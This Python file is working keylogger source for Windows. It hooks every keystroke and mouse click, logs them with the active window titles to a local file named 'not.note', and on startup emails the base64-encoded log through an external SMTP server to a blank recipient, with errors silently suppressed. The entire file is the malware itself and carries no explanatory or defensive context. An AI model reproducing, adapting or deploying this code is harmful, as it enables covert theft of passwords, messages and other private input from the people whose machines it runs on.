# -*- coding: utf-8 -*-

import os
import smtplib
import base64
import pythoncom, pyHook
from datetime import datetime

def send():
    user=''
    pwd=''
    to = ''
    subj = 'User\'s report {}'.format(str(datetime.now()).split('.')[0])
    data = base64.b64encode(open('not.note', 'r+').read())
    body = '\r\n'.join((
        'From: {}'.format(user),
        'To: {}'.format(to),
        'Subject: {}'.format(subj),
        '',
        'Hello, sir!\nHere is a text log\n\n{}\n\nGood luck!'.format(data)
    ))
    server = smtplib.SMTP('smtp.mail.com:25')
    server.login(user, pwd)
    server.sendmail(user, [to], body)
    server.close()

try:
    with open('not.note', 'a') as f:
        f.write('\n{0:-<22}\n[ {1} ]\n{0:-<22}\n'.format('-', str(datetime.now()).split('.')[0]))
        f.close()
    send()

except Exception:
    pass


def wfile(data):
    f = open('not.note', 'a')
    f.write(data)
    f.close()

SYMBOLS = {
    'space': ' ',
    'return': '\n',
    'lshift': ' LSHIFT ',
    'rshift': ' RSHIFT ',
    'tab': ' TAB ',
    'capital': ' CAPITAL ',
    'escape': ' ESCAPE ',
    'delete': ' DELETE ',
    'back': ' BACK ',
    'lcontrol': ' LCTRL ',
    'lmenu': ' LALT ',
    'oem_102': '\\ ',
    'oem_comma': ', ',
    'oem_period': '. ',
    'oem_2': '/ ',
    'oem_1': '; ',
    'oem_7': '\' ',
    'oem_5': '\\ ',
    'oem_4': '[ ',
    'oem_6': ' ] ',
    'oem_minus': ' - ',
    'oem_plus': ' = ',
    'oem_3': ' \` ',
    }

def key(event):
    data = str(event.Key)
    data = data.lower()

    if data in dict(SYMBOLS):
        data = SYMBOLS[data]

    wfile(data)
    data = ''
    return True


def mouse(event):
    data = event.MessageName
    t = str(datetime.now()).split('.')[0]
    if str(data) == 'mouse left down':
        data = '\n{0:-<22}\n{1}\nMouse Left - WindowName:\n{2}\n{0:-<22}\n'.format('-', t, str(event.WindowName))
    elif str(data) == 'mouse right down':
        data = '\n{0:-<22}\n{1}\nMouse Right - WindowName:\n{2}\n{0:-<22}\n'.format('-', t, str(event.WindowName))

    wfile(data)
    data = ''
    return True


hook = pyHook.HookManager()
hook.KeyDown = key
hook.MouseAllButtonsDown = mouse
hook.HookKeyboard()
hook.HookMouse()
pythoncom.PumpMessages()
